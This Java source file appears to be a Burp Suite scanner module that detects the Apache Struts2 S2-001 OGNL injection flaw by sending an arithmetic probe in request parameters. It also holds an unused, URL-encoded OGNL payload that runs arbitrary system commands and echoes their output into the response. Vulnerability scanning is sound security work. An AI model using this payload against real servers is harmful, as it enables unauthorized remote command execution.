package module.java.vul;

import burp.*;

import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;

public class S2_001 implements IModule {
    public int random1 = (int)(Math.random()*1000);
    public int random2 = (int)(Math.random()*1000);
    public String check_poc = "%{" + random1 + "*" + random2 + "}";
    public String exec_payload = "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B{cmd}%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D";

    public IScanIssue start(IHttpRequestResponse iHttpRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        stdout.println("S2_001 start");

        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        URL url = requestInfo.getUrl();
        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(check_poc), parameter.getType());
                byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
                byte[] response = newHttpRequestResponse.getResponse();
                IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
                byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);

                String mark = String.valueOf(random1 * random2);
                String bodyText = new String(body);
                stdout.println(bodyText);
                if (bodyText.contains(mark)) {
                    IScanIssue scanIssue = new CustomScanIssue(
                            httpService,
                            url,
                            new IHttpRequestResponse[]{newHttpRequestResponse},
                            "S2_001",
                            "S2_001",
                            "High"
                    );
                    return scanIssue;
                }
            }
        }
        return null;
    }
}
